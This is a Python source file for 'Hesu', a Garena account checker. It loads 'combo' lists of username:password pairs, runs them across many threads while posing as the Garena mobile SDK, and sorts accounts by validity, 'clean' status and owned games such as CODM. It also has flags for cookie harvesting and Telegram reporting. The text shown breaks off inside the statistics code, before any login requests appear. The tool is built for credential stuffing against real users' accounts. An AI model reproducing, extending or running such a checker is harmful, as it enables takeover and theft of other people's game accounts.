#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Hesu — Garena Account Checker
Redesigned console UI · Hesu branding · by @dvlist
"""
from __future__ import annotations

# ── Auto-install missing packages ────────────────────────────────────────────
def _auto_install():
    import importlib, subprocess, sys

    # (import_name, pip_package_name)
    _REQUIRED = [
        ("colorama",     "colorama"),
        ("requests",     "requests"),
        ("Crypto",       "pycryptodome"),
        ("rich",         "rich"),
    ]

    missing = []
    for mod, pkg in _REQUIRED:
        try:
            importlib.import_module(mod)
        except ModuleNotFoundError:
            missing.append(pkg)

    if not missing:
        return

    print(f"\n  \033[38;2;255;184;0m⚡\033[0m  Installing missing packages: "
          f"\033[1m{', '.join(missing)}\033[0m\n")

    for pkg in missing:
        print(f"  \033[2m→ pip install {pkg}\033[0m")
        result = subprocess.run(
            [sys.executable, "-m", "pip", "install", "--quiet", pkg],
            capture_output=True, text=True
        )
        if result.returncode == 0:
            print(f"  \033[38;2;0;255;140m✔\033[0m  {pkg} installed")
        else:
            print(f"  \033[38;2;255;60;90m✖\033[0m  Failed to install {pkg}:")
            if result.stderr.strip():
                for ln in result.stderr.strip().splitlines()[-3:]:
                    print(f"       \033[2m{ln}\033[0m")
            print(f"\n  Run manually:  pip install {pkg}\n")

    print()

_auto_install()
# ─────────────────────────────────────────────────────────────────────────────

import hashlib
import json
import logging
import threading
import random
import os
import re
import sys
import time
import urllib.parse
import signal
import shutil
import base64
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from collections import deque
from typing import Any, List, Optional, Dict, Tuple

import colorama
from colorama import Fore as _F, Style as _S
import requests
from Crypto.Cipher import AES

from rich import print as rprint
from rich.console import Console
from rich.panel import Panel
from rich.progress import (
    BarColumn, MofNCompleteColumn, Progress,
    SpinnerColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn,
)
from rich.table import Table
from rich.text import Text
from rich.box import Box, DOUBLE, HEAVY, ROUNDED
from rich.columns import Columns
from rich.align import Align
from rich.padding import Padding
from rich import box

colorama.init(autoreset=True)

def _grad_char(ch, r1, g1, b1, r2, g2, b2, t):
    r = int(r1 + (r2 - r1) * t)
    g = int(g1 + (g2 - g1) * t)
    b = int(b1 + (b2 - b1) * t)
    return f'\033[38;2;{r};{g};{b}m{ch}\033[0m'

def _grad_str(text, r1=180, g1=0, b1=255, r2=255, g2=80, b2=200):
    n = max(len(text) - 1, 1)
    return ''.join(_grad_char(ch, r1, g1, b1, r2, g2, b2, i / n) for i, ch in enumerate(text))

_GRAD_VER = '\033[38;2;255;215;80m'   # warm gold (version)
_GRAD_BY  = '\033[38;2;160;160;170m' # soft gray (by)
_GRAD_AT  = '\033[38;2;255;45;149m'  # hot magenta (brand)


console = Console()
_shutil_ui = shutil

# ── Hesu Neon palette ────────────────────────────────────────────────────
# Primary: bright cyan · Brand accent: bright magenta · Success: neon green
_CY  = _F.CYAN     + _S.BRIGHT   # primary
_GN  = _F.GREEN    + _S.BRIGHT   # success
_RD  = _F.RED      + _S.BRIGHT   # error
_YL  = _F.YELLOW   + _S.BRIGHT   # warning
_MG  = _F.MAGENTA  + _S.BRIGHT   # brand accent
_WH  = _F.WHITE    + _S.BRIGHT   # text
_BLU = _F.BLUE     + _S.BRIGHT   # info
_PK  = "\033[38;5;213m"          # pink highlight
_OR  = "\033[38;5;208m"          # orange highlight
_DIM = _S.DIM
_RST = _S.RESET_ALL
_BRT = _S.BRIGHT
_ITL = "\033[3m"
_SL  = "\033[38;5;245m"
_GR  = "\033[38;5;117m"
_GD  = "\033[38;5;222m"
# Rich style strings (new theme: cyan primary, magenta brand)
P  = 'bold #ffd750'
S  = 'bold #ffaa00'
OK = 'bold bright_green'
ER = 'bold bright_red'
WN = 'bold yellow'
MU = 'dim'
TX = 'bright_white'
BL = '#ffd750'

def _tw():
    return _shutil_ui.get_terminal_size((80, 24)).columns

def _w(n=72):
    return min(_tw() - 4, n)

def _ts():
    return datetime.now().strftime('%H:%M:%S')

def _visible_len(text):
    import re
    return len(re.sub(r'\x1b\[[0-9;]*m', '', str(text)))

def _strip_rich(text):
    return re.sub('\\[/?[^\\]]+\\]', '', str(text))

_LOG_ICONS = {
    'INFO':     (_CY, 'ℹ'),
    'SUCCESS':  (_GN, '✔'),
    'WARNING':  (_YL, '⚠'),
    'ERROR':    (_RD, '✖'),
    'DEBUG':    (_DIM, '·'),
    'REQUEST':  (_CY, '→'),
    'RESPONSE': (_CY, '←'),
    'RETRY':    (_YL, '↺'),
    'PROXY':    (_MG, '⬡'),
    'THREAD':   (_MG, '⧫'),
    'SAVE':     (_GN, '⬇'),
}


def _log(level: str, msg: str, indent: str = '  '):
    col, icon = _LOG_ICONS.get(level, (_DIM, '·'))
    clean = _strip_rich(msg)
    print(f'{indent}{col}{icon}{_RST}  {clean}')

THREAD_CONFIGS = {'1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''}, '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''}, '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''}, '4': {'threads': 10, 'label': '10 threads  — Very fast (risk)', 'icon': ''}, '5': {'threads': 15, 'label': '15 threads  — Max speed (high risk)', 'icon': ''}}
CARD = Box('┏━━┓\n┃  ┃\n┣━━┫\n┃  ┃\n┣━━┫\n┣━━┫\n┃  ┃\n┗━━┛\n')
telegram_enabled = False
_telegram_config = None

# ── Nexora-style UI globals ──────────────────────────────────────────────
HARVEST_COOKIES = False
_BULK_MODE = 'full'                     # 'full' | 'semi' | 'none'
_DISPLAY_MODE = 'dashboard'             # 'dashboard' | 'both'
_scroll_lock = threading.Lock()
_scroll_lines = deque(maxlen=500)
_dash_print_lock = threading.Lock()
_active_dashboard = None

def _raw_write(s: str):
    """Write directly to the real terminal, bypassing colorama's wrapper.

    colorama.init(autoreset=True) wraps sys.stdout with a StreamWrapper
    that intercepts ANSI escape sequences. This is fine for color codes,
    but it strips/breaks cursor-control and scroll-region sequences
    (\x1b[1;Nr, \x1b[N;1H, \x1b[0J, etc.).

    For terminal control sequences, we must write to the underlying stream.
    """
    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
    if stream is None:
        stream = getattr(sys.stdout, 'stream', None)
    if stream is None:
        stream = sys.stdout
    try:
        stream.write(s)
    except Exception:
        try:
            sys.__stdout__.write(s)
        except Exception:
            pass

def _raw_flush():
    """Flush the underlying stream (bypassing colorama)."""
    stream = getattr(sys.stdout, '_StreamWrapper__wrapped', None)
    if stream is None:
        stream = getattr(sys.stdout, 'stream', None)
    if stream is None:
        stream = sys.stdout
    try:
        stream.flush()
    except Exception:
        pass

def _scroll_print(line: str):
    """Print a line above the fixed-bottom dashboard without disturbing it."""
    with _scroll_lock:
        _scroll_lines.append(line)
    sys.stdout.write(line + '\n')
    sys.stdout.flush()
# ─────────────────────────────────────────────────────────────────────────

CODM_REGIONS = {'AF':{'name':'Afghanistan','code':'93','flag':'🇦🇫'},'AL':{'name':'Albania','code':'355','flag':'🇦🇱'},'DZ':{'name':'Algeria','code':'213','flag':'🇩🇿'},'AD':{'name':'Andorra','code':'376','flag':'🇦🇩'},'AO':{'name':'Angola','code':'244','flag':'🇦🇴'},'AG':{'name':'Antigua and Barbuda','code':'1','flag':'🇦🇬'},'AR':{'name':'Argentina','code':'54','flag':'🇦🇷'},'AM':{'name':'Armenia','code':'374','flag':'🇦🇲'},'AU':{'name':'Australia','code':'61','flag':'🇦🇺'},'AT':{'name':'Austria','code':'43','flag':'🇦🇹'},'AZ':{'name':'Azerbaijan','code':'994','flag':'🇦🇿'},'BS':{'name':'Bahamas','code':'1','flag':'🇧🇸'},'BH':{'name':'Bahrain','code':'973','flag':'🇧🇭'},'BD':{'name':'Bangladesh','code':'880','flag':'🇧🇩'},'BB':{'name':'Barbados','code':'1','flag':'🇧🇧'},'BY':{'name':'Belarus','code':'375','flag':'🇧🇾'},'BE':{'name':'Belgium','code':'32','flag':'🇧🇪'},'BZ':{'name':'Belize','code':'501','flag':'🇧🇿'},'BJ':{'name':'Benin','code':'229','flag':'🇧🇯'},'BT':{'name':'Bhutan','code':'975','flag':'🇧🇹'},'BO':{'name':'Bolivia','code':'591','flag':'🇧🇴'},'BA':{'name':'Bosnia and Herzegovina','code':'387','flag':'🇧🇦'},'BW':{'name':'Botswana','code':'267','flag':'🇧🇼'},'BR':{'name':'Brazil','code':'55','flag':'🇧🇷'},'BN':{'name':'Brunei','code':'673','flag':'🇧🇳'},'BG':{'name':'Bulgaria','code':'359','flag':'🇧🇬'},'BF':{'name':'Burkina Faso','code':'226','flag':'🇧🇫'},'BI':{'name':'Burundi','code':'257','flag':'🇧🇮'},'KH':{'name':'Cambodia','code':'855','flag':'🇰🇭'},'CM':{'name':'Cameroon','code':'237','flag':'🇨🇲'},'CA':{'name':'Canada','code':'1','flag':'🇨🇦'},'CV':{'name':'Cape Verde','code':'238','flag':'🇨🇻'},'CF':{'name':'Central African Republic','code':'236','flag':'🇨🇫'},'TD':{'name':'Chad','code':'235','flag':'🇹🇩'},'CL':{'name':'Chile','code':'56','flag':'🇨🇱'},'CN':{'name':'China','code':'86','flag':'🇨🇳'},'CO':{'name':'Colombia','code':'57','flag':'🇨🇴'},'KM':{'name':'Comoros','code':'269','flag':'🇰🇲'},'CG':{'name':'Congo','code':'242','flag':'🇨🇬'},'CD':{'name':'Congo (DRC)','code':'243','flag':'🇨🇩'},'CR':{'name':'Costa Rica','code':'506','flag':'🇨🇷'},'CI':{'name':"Côte d'Ivoire",'code':'225','flag':'🇨🇮'},'HR':{'name':'Croatia','code':'385','flag':'🇭🇷'},'CU':{'name':'Cuba','code':'53','flag':'🇨🇺'},'CY':{'name':'Cyprus','code':'357','flag':'🇨🇾'},'CZ':{'name':'Czech Republic','code':'420','flag':'🇨🇿'},'DK':{'name':'Denmark','code':'45','flag':'🇩🇰'},'DJ':{'name':'Djibouti','code':'253','flag':'🇩🇯'},'DM':{'name':'Dominica','code':'1','flag':'🇩🇲'},'DO':{'name':'Dominican Republic','code':'1','flag':'🇩🇴'},'EC':{'name':'Ecuador','code':'593','flag':'🇪🇨'},'EG':{'name':'Egypt','code':'20','flag':'🇪🇬'},'SV':{'name':'El Salvador','code':'503','flag':'🇸🇻'},'GQ':{'name':'Equatorial Guinea','code':'240','flag':'🇬🇶'},'ER':{'name':'Eritrea','code':'291','flag':'🇪🇷'},'EE':{'name':'Estonia','code':'372','flag':'🇪🇪'},'SZ':{'name':'Eswatini','code':'268','flag':'🇸🇿'},'ET':{'name':'Ethiopia','code':'251','flag':'🇪🇹'},'FJ':{'name':'Fiji','code':'679','flag':'🇫🇯'},'FI':{'name':'Finland','code':'358','flag':'🇫🇮'},'FR':{'name':'France','code':'33','flag':'🇫🇷'},'GA':{'name':'Gabon','code':'241','flag':'🇬🇦'},'GM':{'name':'Gambia','code':'220','flag':'🇬🇲'},'GE':{'name':'Georgia','code':'995','flag':'🇬🇪'},'DE':{'name':'Germany','code':'49','flag':'🇩🇪'},'GH':{'name':'Ghana','code':'233','flag':'🇬🇭'},'GR':{'name':'Greece','code':'30','flag':'🇬🇷'},'GD':{'name':'Grenada','code':'1','flag':'🇬🇩'},'GT':{'name':'Guatemala','code':'502','flag':'🇬🇹'},'GN':{'name':'Guinea','code':'224','flag':'🇬🇳'},'GW':{'name':'Guinea-Bissau','code':'245','flag':'🇬🇼'},'GY':{'name':'Guyana','code':'592','flag':'🇬🇾'},'HT':{'name':'Haiti','code':'509','flag':'🇭🇹'},'HN':{'name':'Honduras','code':'504','flag':'🇭🇳'},'HK':{'name':'Hong Kong','code':'852','flag':'🇭🇰'},'HU':{'name':'Hungary','code':'36','flag':'🇭🇺'},'IS':{'name':'Iceland','code':'354','flag':'🇮🇸'},'IN':{'name':'India','code':'91','flag':'🇮🇳'},'ID':{'name':'Indonesia','code':'62','flag':'🇮🇩'},'IR':{'name':'Iran','code':'98','flag':'🇮🇷'},'IQ':{'name':'Iraq','code':'964','flag':'🇮🇶'},'IE':{'name':'Ireland','code':'353','flag':'🇮🇪'},'IL':{'name':'Israel','code':'972','flag':'🇮🇱'},'IT':{'name':'Italy','code':'39','flag':'🇮🇹'},'JM':{'name':'Jamaica','code':'1','flag':'🇯🇲'},'JP':{'name':'Japan','code':'81','flag':'🇯🇵'},'JO':{'name':'Jordan','code':'962','flag':'🇯🇴'},'KZ':{'name':'Kazakhstan','code':'7','flag':'🇰🇿'},'KE':{'name':'Kenya','code':'254','flag':'🇰🇪'},'KI':{'name':'Kiribati','code':'686','flag':'🇰🇮'},'KR':{'name':'South Korea','code':'82','flag':'🇰🇷'},'KW':{'name':'Kuwait','code':'965','flag':'🇰🇼'},'KG':{'name':'Kyrgyzstan','code':'996','flag':'🇰🇬'},'LA':{'name':'Laos','code':'856','flag':'🇱🇦'},'LV':{'name':'Latvia','code':'371','flag':'🇱🇻'},'LB':{'name':'Lebanon','code':'961','flag':'🇱🇧'},'LS':{'name':'Lesotho','code':'266','flag':'🇱🇸'},'LR':{'name':'Liberia','code':'231','flag':'🇱🇷'},'LY':{'name':'Libya','code':'218','flag':'🇱🇾'},'LI':{'name':'Liechtenstein','code':'423','flag':'🇱🇮'},'LT':{'name':'Lithuania','code':'370','flag':'🇱🇹'},'LU':{'name':'Luxembourg','code':'352','flag':'🇱🇺'},'MO':{'name':'Macau','code':'853','flag':'🇲🇴'},'MG':{'name':'Madagascar','code':'261','flag':'🇲🇬'},'MW':{'name':'Malawi','code':'265','flag':'🇲🇼'},'MY':{'name':'Malaysia','code':'60','flag':'🇲🇾'},'MV':{'name':'Maldives','code':'960','flag':'🇲🇻'},'ML':{'name':'Mali','code':'223','flag':'🇲🇱'},'MT':{'name':'Malta','code':'356','flag':'🇲🇹'},'MH':{'name':'Marshall Islands','code':'692','flag':'🇲🇭'},'MR':{'name':'Mauritania','code':'222','flag':'🇲🇷'},'MU':{'name':'Mauritius','code':'230','flag':'🇲🇺'},'MX':{'name':'Mexico','code':'52','flag':'🇲🇽'},'FM':{'name':'Micronesia','code':'691','flag':'🇫🇲'},'MD':{'name':'Moldova','code':'373','flag':'🇲🇩'},'MC':{'name':'Monaco','code':'377','flag':'🇲🇨'},'MN':{'name':'Mongolia','code':'976','flag':'🇲🇳'},'ME':{'name':'Montenegro','code':'382','flag':'🇲🇪'},'MA':{'name':'Morocco','code':'212','flag':'🇲🇦'},'MZ':{'name':'Mozambique','code':'258','flag':'🇲🇿'},'MM':{'name':'Myanmar','code':'95','flag':'🇲🇲'},'NA':{'name':'Namibia','code':'264','flag':'🇳🇦'},'NR':{'name':'Nauru','code':'674','flag':'🇳🇷'},'NP':{'name':'Nepal','code':'977','flag':'🇳🇵'},'NL':{'name':'Netherlands','code':'31','flag':'🇳🇱'},'NZ':{'name':'New Zealand','code':'64','flag':'🇳🇿'},'NI':{'name':'Nicaragua','code':'505','flag':'🇳🇮'},'NE':{'name':'Niger','code':'227','flag':'🇳🇪'},'NG':{'name':'Nigeria','code':'234','flag':'🇳🇬'},'MK':{'name':'North Macedonia','code':'389','flag':'🇲🇰'},'NO':{'name':'Norway','code':'47','flag':'🇳🇴'},'OM':{'name':'Oman','code':'968','flag':'🇴🇲'},'PK':{'name':'Pakistan','code':'92','flag':'🇵🇰'},'PW':{'name':'Palau','code':'680','flag':'🇵🇼'},'PA':{'name':'Panama','code':'507','flag':'🇵🇦'},'PG':{'name':'Papua New Guinea','code':'675','flag':'🇵🇬'},'PY':{'name':'Paraguay','code':'595','flag':'🇵🇾'},'PE':{'name':'Peru','code':'51','flag':'🇵🇪'},'PH':{'name':'Philippines','code':'63','flag':'🇵🇭'},'PL':{'name':'Poland','code':'48','flag':'🇵🇱'},'PT':{'name':'Portugal','code':'351','flag':'🇵🇹'},'QA':{'name':'Qatar','code':'974','flag':'🇶🇦'},'RO':{'name':'Romania','code':'40','flag':'🇷🇴'},'RU':{'name':'Russia','code':'7','flag':'🇷🇺'},'RW':{'name':'Rwanda','code':'250','flag':'🇷🇼'},'KN':{'name':'Saint Kitts and Nevis','code':'1','flag':'🇰🇳'},'LC':{'name':'Saint Lucia','code':'1','flag':'🇱🇨'},'VC':{'name':'Saint Vincent and the Grenadines','code':'1','flag':'🇻🇨'},'WS':{'name':'Samoa','code':'685','flag':'🇼🇸'},'SM':{'name':'San Marino','code':'378','flag':'🇸🇲'},'ST':{'name':'São Tomé and Príncipe','code':'239','flag':'🇸🇹'},'SA':{'name':'Saudi Arabia','code':'966','flag':'🇸🇦'},'SN':{'name':'Senegal','code':'221','flag':'🇸🇳'},'RS':{'name':'Serbia','code':'381','flag':'🇷🇸'},'SC':{'name':'Seychelles','code':'248','flag':'🇸🇨'},'SL':{'name':'Sierra Leone','code':'232','flag':'🇸🇱'},'SG':{'name':'Singapore','code':'65','flag':'🇸🇬'},'SK':{'name':'Slovakia','code':'421','flag':'🇸🇰'},'SI':{'name':'Slovenia','code':'386','flag':'🇸🇮'},'SB':{'name':'Solomon Islands','code':'677','flag':'🇸🇧'},'SO':{'name':'Somalia','code':'252','flag':'🇸🇴'},'ZA':{'name':'South Africa','code':'27','flag':'🇿🇦'},'SS':{'name':'South Sudan','code':'211','flag':'🇸🇸'},'ES':{'name':'Spain','code':'34','flag':'🇪🇸'},'LK':{'name':'Sri Lanka','code':'94','flag':'🇱🇰'},'SD':{'name':'Sudan','code':'249','flag':'🇸🇩'},'SR':{'name':'Suriname','code':'597','flag':'🇸🇷'},'SE':{'name':'Sweden','code':'46','flag':'🇸🇪'},'CH':{'name':'Switzerland','code':'41','flag':'🇨🇭'},'SY':{'name':'Syria','code':'963','flag':'🇸🇾'},'TW':{'name':'Taiwan','code':'886','flag':'🇹🇼'},'TJ':{'name':'Tajikistan','code':'992','flag':'🇹🇯'},'TZ':{'name':'Tanzania','code':'255','flag':'🇹🇿'},'TH':{'name':'Thailand','code':'66','flag':'🇹🇭'},'TL':{'name':'Timor-Leste','code':'670','flag':'🇹🇱'},'TG':{'name':'Togo','code':'228','flag':'🇹🇬'},'TO':{'name':'Tonga','code':'676','flag':'🇹🇴'},'TT':{'name':'Trinidad and Tobago','code':'1','flag':'🇹🇹'},'TN':{'name':'Tunisia','code':'216','flag':'🇹🇳'},'TR':{'name':'Turkey','code':'90','flag':'🇹🇷'},'TM':{'name':'Turkmenistan','code':'993','flag':'🇹🇲'},'TV':{'name':'Tuvalu','code':'688','flag':'🇹🇻'},'UG':{'name':'Uganda','code':'256','flag':'🇺🇬'},'UA':{'name':'Ukraine','code':'380','flag':'🇺🇦'},'AE':{'name':'United Arab Emirates','code':'971','flag':'🇦🇪'},'GB':{'name':'United Kingdom','code':'44','flag':'🇬🇧'},'US':{'name':'United States','code':'1','flag':'🇺🇸'},'UY':{'name':'Uruguay','code':'598','flag':'🇺🇾'},'UZ':{'name':'Uzbekistan','code':'998','flag':'🇺🇿'},'VU':{'name':'Vanuatu','code':'678','flag':'🇻🇺'},'VA':{'name':'Vatican City','code':'39','flag':'🇻🇦'},'VE':{'name':'Venezuela','code':'58','flag':'🇻🇪'},'VN':{'name':'Vietnam','code':'84','flag':'🇻🇳'},'YE':{'name':'Yemen','code':'967','flag':'🇾🇪'},'ZM':{'name':'Zambia','code':'260','flag':'🇿🇲'},'ZW':{'name':'Zimbabwe','code':'263','flag':'🇿🇼'}}

def _make_session(pool_size=64):
    """Build a requests.Session tuned for high-throughput checking.

    Args:
        pool_size: max simultaneous connections per host. 64 is a good
            default; raise it for very large thread pools.
    """
    s = requests.Session()
    # Transport-level retries: 1 retry on connection errors, with 0.3s
    # backoff. This is faster than the manual Python-level retry loop,
    # because urllib3 handles it in C while the GIL is released.
    from urllib3.util.retry import Retry
    retry = Retry(
        total=1,
        connect=1,
        read=0,
        status=0,
        backoff_factor=0.3,
        status_forcelist=[],
        allowed_methods=['GET', 'POST'],
    )
    adapter = requests.adapters.HTTPAdapter(
        pool_connections=pool_size,
        pool_maxsize=pool_size,
        max_retries=retry,
        pool_block=True,            # wait for a free conn instead of failing
    )
    s.mount('http://', adapter)
    s.mount('https://', adapter)
    return s


def sanitize_string(text):
    if not text or text == 'N/A':
        return text
    try:
        return text.encode('ascii', errors='ignore').decode('ascii')
    except:
        return re.sub('[^\\x00-\\x7F]+', '', str(text))

def clean_account_line(line):
    if not line:
        return (None, None)
    line = line.strip().lstrip('\ufeff\ufffe')
    line = ''.join((char for char in line if char.isprintable() or char == ':'))
    if ':' not in line:
        return (None, None)
    try:
        parts = line.split(':', 1)
        if len(parts) != 2:
            return (None, None)
        account = parts[0].strip()
        password = parts[1].strip()
        account = sanitize_string(account)
        password = sanitize_string(password)
        if not account or not password:
            return (None, None)
        return (account, password)
    except:
        return (None, None)

def format_codm_region(region_code):
    if not region_code or region_code == 'N/A':
        return 'N/A'
    region_code = region_code.upper()
    region_info = CODM_REGIONS.get(region_code)
    if region_info:
        return f"{region_info['flag']} {region_info['name']} ({region_code})"
    else:
        return f'{region_code}'

def format_mobile_number(mobile_no, country_code=None):
    if not mobile_no or mobile_no == 'N/A' or (not str(mobile_no).strip()):
        return 'N/A'
    mobile_str = str(mobile_no).strip()
    mobile_str = mobile_str.replace('+', '').replace(' ', '').replace('-', '')
    if country_code:
        country_code = str(country_code).strip()
        if not mobile_str.startswith(country_code):
            if mobile_str.startswith('0'):
                mobile_str = country_code + mobile_str[1:]
            else:
                mobile_str = country_code + mobile_str
    detected_country_code = None
    for code_key, region_info in CODM_REGIONS.items():
        code = region_info['code']
        if mobile_str.startswith(code):
            detected_country_code = code
            break
    if detected_country_code:
        local_number = mobile_str[len(detected_country_code):]
        if len(local_number) >= 4:
            masked = '*' * (len(local_number) - 4) + local_number[-4:]
            return f'+{detected_country_code} {masked}'
        else:
            return f'+{detected_country_code} {local_number}'
    elif len(mobile_str) >= 4:
        masked = '*' * (len(mobile_str) - 4) + mobile_str[-4:]
        return f'+{masked}'
    else:
        return mobile_str

def _sigint_handler(sig, frame):
    print(f'\n  {_YL}⚠  Ctrl+C – exiting immediately…{_RST}')
    os._exit(0)
signal.signal(signal.SIGINT, _sigint_handler)

class ColoredFormatter(logging.Formatter):
    COLORS = {'DEBUG': colorama.Fore.CYAN, 'INFO': colorama.Fore.CYAN, 'WARNING': colorama.Fore.YELLOW, 'ERROR': colorama.Fore.RED, 'CRITICAL': colorama.Fore.RED + colorama.Back.BLACK + colorama.Style.BRIGHT}
    ICONS = {'DEBUG': '⊡', 'INFO': 'ℹ', 'WARNING': '⚠', 'ERROR': '✖', 'CRITICAL': '☠'}
    RESET = colorama.Style.RESET_ALL

    def format(self, record):
        levelname = record.levelname
        color = self.COLORS.get(levelname, '')
        icon = self.ICONS.get(levelname, '·')
        tag = f'{levelname:<8}'
        if color:
            record.msg = f'{color}{icon} {tag}{self.RESET} {record.msg}'
        return super().format(record)

logger = logging.getLogger()
handler = logging.StreamHandler()
handler.setFormatter(ColoredFormatter())
logger.addHandler(handler)
logger.setLevel(logging.INFO)
logging.getLogger('urllib3').setLevel(logging.ERROR)
logging.getLogger('requests').setLevel(logging.ERROR)

DEFAULT_THREADS = 30
CHECK_OTHER_GAMES: bool = False
GAME_FILE_MAP = {'CODM': 'CODM.txt', 'FREEFIRE': 'FreeFire.txt', 'FREE FIRE': 'FreeFire.txt', 'ROV': 'ROV.txt', 'DELTA FORCE': 'DeltaForce.txt', 'AOV': 'AOV.txt', 'SPEED DRIFTERS': 'SpeedDrifters.txt', 'BLACK CLOVER M': 'BlackCloverM.txt', 'GARENA UNDAWN': 'Undawn.txt', 'FC ONLINE': 'FCOnline.txt', 'FC ONLINE M': 'FCOnlineM.txt', 'MOONLIGHT BLADE': 'MoonlightBlade.txt', 'FAST THRILL': 'FastThrill.txt', 'THE WORLD OF WAR': 'WorldOfWar.txt'}
GAME_DISPLAY_NAMES = [('CODM', 'CODM'), ('FREEFIRE', 'Free Fire'), ('ROV', 'ROV'), ('DELTA FORCE', 'Delta Force'), ('AOV', 'AOV'), ('SPEED DRIFTERS', 'Speed Drifters'), ('BLACK CLOVER M', 'Black Clover M'), ('GARENA UNDAWN', 'Undawn'), ('FC ONLINE', 'FC Online'), ('FC ONLINE M', 'FC Online M'), ('MOONLIGHT BLADE', 'Moonlight Blade'), ('FAST THRILL', 'Fast Thrill'), ('THE WORLD OF WAR', 'World of War')]
OAUTH_MAX_RETRIES = 3
OAUTH_RETRY_DELAY = 2

MSDK_UA = (
    "Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)"
)
MSDK_SEC_CH_UA = '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"'

class AccountFileManager:

    def __init__(self, combo_folder='Combo'):
        self.combo_folder = Path(combo_folder)
        self.combo_folder.mkdir(exist_ok=True)
        self._file_lock = threading.Lock()

    def scan_combo_folder(self):
        return list(self.combo_folder.glob('*.txt'))

    def get_file_info(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip() and ':' in line]
                account_count = len(lines)
            file_size = file_path.stat().st_size
            return {'name': file_path.name, 'path': str(file_path), 'size': file_size, 'size_str': self._format_size(file_size), 'account_count': account_count}
        except Exception as e:
            logger.error(f'Error reading file {file_path}')
            return None

    def _format_size(self, size_bytes):
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size_bytes < 1024.0:
                return f'{size_bytes:.2f} {unit}'
            size_bytes /= 1024.0
        return f'{size_bytes:.2f} TB'

    def clean_file_encoding(self, file_path):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()
            cleaned_lines = []
            invalid_count = 0
            for line in lines:
                account, password = clean_account_line(line)
                if account and password:
                    cleaned_lines.append(f'{account}:{password}\n')
                else:
                    invalid_count += 1
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(cleaned_lines)
            return (len(cleaned_lines), invalid_count)
        except Exception as e:
            logger.error(f'Error cleaning file encoding')
            return (0, 0)

    def clean_duplicates(self, file_path, overwrite=True):
        file_path = Path(file_path)
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                lines = [line.strip() for line in f if line.strip()]
            original_count = len(lines)
            unique_lines = list(dict.fromkeys(lines))
            duplicates_removed = original_count - len(unique_lines)
            if overwrite:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            else:
                new_path = file_path.parent / f'{file_path.stem}_cleaned.txt'
                with open(new_path, 'w', encoding='utf-8') as f:
                    f.write('\n'.join(unique_lines))
            return duplicates_removed
        except Exception as e:
            logger.error(f'Error cleaning duplicates')
            return 0

    def remove_line_from_file(self, file_path, line_to_remove):
        try:
            file_path = Path(file_path)
            target = line_to_remove.strip()
            with self._file_lock:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    lines = f.readlines()
                with open(file_path, 'w', encoding='utf-8') as f:
                    for line in lines:
                        if line.strip() != target:
                            f.write(line)
            return True
        except Exception as e:
            logger.error(f'Error removing line')
            return False

class AccountFileViewer:
    def __init__(self):
        self.console = Console()

    def display_file_table(self, file_infos):
        print()
        table = Table(box=box.SIMPLE_HEAD, header_style="bold #ffaa00", border_style="dim", padding=(0, 2))
        table.add_column("#", style="bold #ffaa00", justify="right", width=3)
        table.add_column("Filename", style="bold white")
        table.add_column("Size", style="dim", justify="right")
        table.add_column("Accounts", style="bright_white", justify="right")
        table.add_column("", width=18)
        max_ac = max((i['account_count'] for i in file_infos)) if file_infos else 1
        for idx, info in enumerate(file_infos, 1):
            bar_w = 16
            filled = int(info['account_count'] / max_ac * bar_w)
            bar = f"[#ffaa00]{'█' * filled}[/#ffaa00][dim]{'░' * (bar_w - filled)}[/dim]"
            table.add_row(str(idx), info['name'], info['size_str'], f"{info['account_count']:,}", bar)
        self.console.print(table)
        print()

    def prompt_file_selection(self, file_infos):
        while True:
            choice = input(f"  \033[38;2;255;170;0m>\033[0m file # or 'auto': ").strip().lower()
            if choice == 'auto':
                largest = max(file_infos, key=lambda x: x['account_count'])
                _log('SUCCESS', f"Auto-selected: {largest['name']}")
                return largest['path']
            try:
                idx = int(choice)
                if 1 <= idx <= len(file_infos):
                    return file_infos[idx - 1]['path']
                _log('ERROR', 'Invalid number — try again.')
            except ValueError:
                _log('ERROR', "Enter a number or 'auto'.")

    def prompt_clean_file(self):
        print()
        choice = input(f"  \033[38;2;255;170;0m>\033[0m clean file encoding? (Y/n): ").strip().lower()
        return choice != 'n'

    def prompt_remove_duplicates(self):
        choice = input(f"  \033[38;2;255;170;0m>\033[0m remove duplicates? (y/N): ").strip().lower()
        return choice == 'y'

    def prompt_auto_remove_checked(self):
        choice = input(f"  \033[38;2;255;170;0m>\033[0m auto-remove checked? (y/N): ").strip().lower()
        return choice == 'y'

class LiveStats:
    def __init__(self):
        self.valid_count = self.invalid_count = self.clean_count = self.not_clean_count = 0
        self.has_codm_count = self.no_codm_count = self.error_count = 0
        self.highest_clean_level = self.highest_not_clean_level = self.highest_shell = 0
        self.clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
        self.not_clean_level_counts = {'351-400':0,'201-350':0,'101-200':0,'1-100':0}
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.total_accounts = 0
        self.game_counts = {k:0 for k,_ in GAME_DISPLAY_NAMES}
        self.last_result_queue = deque(maxlen=200)

    def update_stats(self, valid=False, clean=False, has_codm=False, is_error=False, codm_level=0, game_connections=None, shell=0):
        with self.lock:
            if is_error:
                self.error_count += 1
            elif valid:
